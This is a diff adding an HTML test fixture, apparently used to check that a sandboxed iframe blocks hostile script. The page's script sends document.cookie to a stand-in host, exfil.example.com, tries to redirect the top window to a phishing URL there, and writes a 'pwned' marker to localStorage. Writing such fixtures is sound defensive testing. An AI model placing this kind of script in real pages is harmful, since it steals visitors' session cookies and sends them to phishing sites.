@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8" /><title>Malicious fixture: exfil attempt</title></head>
+<body>
+  <h1>Totally innocent page</h1>
+  <button id="steal">Click me</button>
+  <script>
+    try {
+      fetch('https://exfil.example.com/steal?cookie=' + encodeURIComponent(document.cookie));
+    } catch (e) { /* sandboxed */ }
+    try {
+      window.top.location = 'https://exfil.example.com/phish';
+    } catch (e) { /* sandboxed */ }
+    try {
+      localStorage.setItem('pwned', 'yes');
+    } catch (e) { /* opaque origin */ }
+  </script>
+</body>
+</html>
